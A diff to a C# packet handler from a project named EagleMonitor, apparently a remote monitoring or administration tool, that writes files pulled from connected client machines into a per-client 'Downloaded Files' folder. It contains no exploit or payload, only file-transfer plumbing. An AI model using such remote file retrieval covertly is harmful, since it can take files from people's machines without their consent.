@@ -1,8 +1,6 @@
 ﻿using EagleMonitor.Networking;
 using EagleMonitor.Utils;
-using PacketLib;
 using PacketLib.Packet;
-using System.Threading;
 
 /* 
 || AUTHOR Arsium ||
@@ -15,30 +13,34 @@ namespace EagleMonitor.PacketParser
     {
         public DownloadFilePacketHandler(DownloadFilePacket downloadFilePacket, ClientHandler clientHandler) : base()
         {
-            new Thread(() =>
+            try
             {
-                try
+                if (downloadFilePacket.file == null)
                 {
-                    if (clientHandler.fileManagerForm != null)
-                    {
-                        if (clientHandler.fileManagerForm.files != null)
-                        {
-                            if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\Downloaded Files\\"))
-                                System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Downloaded Files");
-                            System.IO.File.WriteAllBytes(clientHandler.clientPath + "\\Downloaded Files\\" + Miscellaneous.SplitPath(downloadFilePacket.fileName), downloadFilePacket.file);
-                            clientHandler.fileManagerForm.files[Miscellaneous.SplitPath(downloadFilePacket.fileName)].Close();
-                            clientHandler.fileManagerForm.files.Remove(Miscellaneous.SplitPath(downloadFilePacket.fileName));
-                        }
-                    }
-                    else
+                    clientHandler.fileManagerForm.files[Miscellaneous.SplitPath(downloadFilePacket.fileName)].Close();
+                    clientHandler.fileManagerForm.files.Remove(Miscellaneous.SplitPath(downloadFilePacket.fileName));
+                    return;
+                }
+
+                if (clientHandler.fileManagerForm != null)
+                {
+                    if (clientHandler.fileManagerForm.files != null)
                     {
                         if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\Downloaded Files\\"))
                             System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Downloaded Files");
-                        System.IO.File.WriteAllBytes(clientHandler.clientPath + "\\Downloaded Files\\" + Miscellaneous.SplitPath(downloadFilePacket.fileName),downloadFilePacket.file);
+                        System.IO.File.WriteAllBytes(clientHandler.clientPath + "\\Downloaded Files\\" + Miscellaneous.SplitPath(downloadFilePacket.fileName), downloadFilePacket.file);
+                        clientHandler.fileManagerForm.files[Miscellaneous.SplitPath(downloadFilePacket.fileName)].Close();
+                        clientHandler.fileManagerForm.files.Remove(Miscellaneous.SplitPath(downloadFilePacket.fileName));
                     }
                 }
-                catch { }
-            }).Start();
+                else
+                {
+                    if (!System.IO.Directory.Exists(clientHandler.clientPath + "\\Downloaded Files\\"))
+                        System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Downloaded Files");
+                    System.IO.File.WriteAllBytes(clientHandler.clientPath + "\\Downloaded Files\\" + Miscellaneous.SplitPath(downloadFilePacket.fileName), downloadFilePacket.file);
+                }
+            }
+            catch { }
         }
     }
 }
